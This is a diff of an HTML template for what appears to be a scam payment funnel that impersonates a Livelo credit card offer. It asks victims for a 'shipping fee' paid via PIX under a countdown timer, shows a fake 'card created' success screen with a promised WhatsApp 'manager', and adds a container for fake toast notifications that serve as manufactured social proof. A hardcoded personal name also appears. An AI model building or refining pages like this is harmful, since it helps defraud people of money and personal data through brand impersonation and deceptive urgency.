-<span style="color:#1A1A1A;font-weight:600">MÉTODO DE ENVIO</span><br/>SEDEX - Entrega expressa<br/><br/>
-<span style="color:#1A1A1A;font-weight:600">PRAZO ESTIMADO</span><br/>até 3 dias úteis após aprovação<br/><br/>
-<span style="color:#1A1A1A;font-weight:600">VALOR DO FRETE</span><br/>R$ 29,90 (pagamento único)
-        </div>
+<button class="btn-primary" onclick="goToStep('pix')" style="margin-top:0;margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:8px">
+Pagar Frete <svg fill="none" height="16" viewbox="0 0 24 24" width="16" stroke="currentColor" stroke-width="2"><rect height="11" rx="2" ry="2" width="18" x="3" y="11"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+</button>
+<div style="display:flex;align-items:center;justify-content:center;gap:6px;font-size:0.75rem;font-weight:600;color:var(--text-muted);margin-bottom:24px">
+  <svg fill="none" height="16" viewBox="0 0 24 24" width="16" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="color:#10B981"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+  <span>Pagamento 100% seguro</span>
 </div>
-<div style="flex:1;background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px">
-<div style="font-size:0.75rem;font-weight:700;color:var(--text);margin-bottom:8px">Dados de entrega</div>
-<div style="font-size:0.7rem;color:var(--text-muted);line-height:1.4">
-<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">NOME DO DESTINATÁRIO</span><br/><span id="sum-nome">VITOR DANIEL MUNDIM</span><br/><br/>
-<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">ENDEREÇO</span><br/><span id="sum-rua"></span><br/><br/>
-<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">BAIRRO</span><br/><span id="sum-bairro"></span>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px">
+<div style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px;font-size:0.7rem">
+<div style="font-weight:700;color:#1A1A1A;margin-bottom:8px">Resumo do frete</div>
+<div style="color:var(--text-muted);margin-bottom:2px">MÉTODO DE ENVIO</div>
+<div style="font-weight:600;margin-bottom:8px" id="sum-frete-tipo">SEDEX - Entrega expressa</div>
+<div style="color:var(--text-muted);margin-bottom:2px">PRAZO ESTIMADO</div>
+<div style="font-weight:600;margin-bottom:8px" id="sum-frete-prazo">até 3 dias úteis após aprovação do pagamento</div>
+<div style="color:var(--text-muted);margin-bottom:2px">VALOR DO FRETE</div>
+<div style="font-weight:600" id="sum-frete-valor">R$ 29,90 <span style="font-weight:normal">(pagamento único)</span></div>
+</div>
+<div style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px;font-size:0.7rem">
+<div style="font-weight:700;color:#1A1A1A;margin-bottom:8px">Dados de entrega</div>
+<div style="color:var(--text-muted);margin-bottom:2px">NOME DO DESTINATÁRIO</div>
+<div style="font-weight:600;margin-bottom:8px;text-transform:uppercase" id="sum-nome"></div>
+<div style="color:var(--text-muted);margin-bottom:2px">ENDEREÇO</div>
+<div style="font-weight:600;margin-bottom:8px" id="sum-rua"></div>
+<div style="color:var(--text-muted);margin-bottom:2px">BAIRRO</div>
+<div style="font-weight:600;margin-bottom:8px" id="sum-bairro"></div>
 </div>
 </div>
-</div>
-
-
 </div>
 </div>
 <!-- ═══════ PIX (Img 3) ═══════ -->
@@ -731,9 +778,9 @@ Continuar
 
 <!-- Stepper -->
 <div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:24px;font-size:0.7rem;font-weight:600;color:var(--text-muted)">
-<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;font-size:9px">✓</div> Cadastro</div>
+<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="8" height="8"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg></div> Cadastro</div>
 <div style="width:16px;height:1px;background:#E5E7EB"></div>
-<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;font-size:9px">✓</div> Endereço</div>
+<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="8" height="8"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg></div> Endereço</div>
 <div style="width:16px;height:1px;background:#E5E7EB"></div>
 <div style="display:flex;align-items:center;gap:4px;color:var(--pink)"><div style="width:14px;height:14px;border-radius:50%;background:var(--pink);color:white;display:flex;align-items:center;justify-content:center;font-size:9px">3</div> Pagamento</div>
 </div>
@@ -792,7 +839,7 @@ Continuar
       </div>
 </div>
 <div style="background:#FEE2E2;color:#EF4444;border-radius:8px;padding:10px;text-align:center;font-size:0.75rem;font-weight:700;margin:12px 0 24px">
-<span style="display:inline-block;margin-right:4px">⏰</span> <span id="pix-timer">07:35</span>
+<span style="display:inline-flex;align-items:center;justify-content:center;margin-right:4px;vertical-align:middle;"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="14" height="14" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></span> <span id="pix-timer">07:35</span>
 <div style="font-size:0.65rem;font-weight:500;margin-top:2px">Esta oportunidade é válida apenas hoje!</div>
 </div>
 
@@ -851,6 +898,59 @@ window.fetch = encryptedFetch;
   window.APP_WA_TEXT = `{{ sys_config.get('wa_text', 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!') }}`;
 </script>
 <script src="/static/js/main.js"></script>
+
+  
+    <!-- TELA SUCESSO -->
+    <div id="screen-sucesso" class="screen">
+      <div class="content-box" style="text-align: center; max-width: 450px;">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2" style="width: 64px; height: 64px; margin: 0 auto 16px;">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
+        <h2 style="font-size: 1.8rem; font-weight: 800; color: #10B981; margin-bottom: 8px;">Cartão Criado com Sucesso!</h2>
+        <p style="color: var(--text-dim); margin-bottom: 24px; line-height: 1.5;">O seu pagamento foi confirmado e a fabricação do seu cartão Livelo foi iniciada.</p>
+        
+        <div style="position: relative; perspective: 1000px; margin: 30px auto; width: 100%; max-width: 300px; height: 180px;">
+          <div id="success-card-visual" style="width: 100%; height: 100%; border-radius: 16px; background: linear-gradient(135deg, #E5147A, #5e0b34); padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: flex; flex-direction: column; justify-content: flex-end; position: relative; animation: successFloat 3s ease-in-out infinite;">
+            <div style="position: absolute; top: 16px; right: 16px;">
+              <svg width="40" height="28" viewBox="0 0 40 28" fill="none" style="opacity: 0.8"><rect x="0.5" y="0.5" width="39" height="27" rx="3.5" fill="#C4C4C4" fill-opacity="0.2" stroke="white"/><path d="M7 10H14V18H7V10Z" fill="white" fill-opacity="0.8"/></svg>
+            </div>
+            <div id="success-card-name" style="color: #fff; font-size: 1.1rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;">SEU NOME</div>
+            <div style="color: rgba(255,255,255,0.7); font-size: 0.75rem; margin-top: 4px;">Limite Liberado: <span id="success-card-limit" style="font-weight: 800; color: #fff;">-</span></div>
+          </div>
+        </div>
+
+        <div style="background: rgba(229, 20, 122, 0.1); border: 1px solid var(--primary); padding: 16px; border-radius: 12px; margin-top: 24px;">
+          <h4 style="color: var(--primary); font-weight: 700; margin-bottom: 8px;">Atenção</h4>
+          <p style="font-size: 0.85rem; color: var(--text-dim); line-height: 1.4;">A sua gerente entrará em contato com você pelo WhatsApp em um prazo estimado de <strong>3 a 5 minutos</strong> para confirmar o endereço de entrega.</p>
+        </div>
+        
+        <a id="btn-contact-manager" href="#" target="_blank" class="btn" style="margin-top: 24px;">
+          Falar com a Gerente Agora
+          <svg style="width: 20px; height: 20px; margin-left:8px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+        </a>
+      </div>
+    </div>
+    
+    <!-- FAKE TOAST CONTAINER -->
+    <div id="fake-toast-container" style="position: fixed; bottom: 20px; left: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; pointer-events: none;"></div>
+    
+    <style>
+      @keyframes successFloat {
+        0%, 100% { transform: translateY(0) rotateX(5deg) rotateY(0deg); }
+        50% { transform: translateY(-10px) rotateX(10deg) rotateY(-5deg); box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
+      }
+      .fake-toast {
+        background: var(--bg-card); border: 1px solid var(--border); padding: 12px 16px; border-radius: 8px;
+        display: flex; align-items: center; gap: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        transform: translateX(-100%); opacity: 0; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      }
+      .fake-toast.show { transform: translateX(0); opacity: 1; }
+      .fake-toast-img { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
+      .fake-toast-content { display: flex; flex-direction: column; }
+      .fake-toast-title { font-size: 0.8rem; font-weight: 700; color: var(--text); }
+      .fake-toast-desc { font-size: 0.7rem; color: var(--text-dim); }
+    </style>
 
   </main>
   <footer class="funnel-footer" style="padding: 30px 20px; text-align: center; color: var(--text-muted); font-size: 0.85rem; width: 100%;">
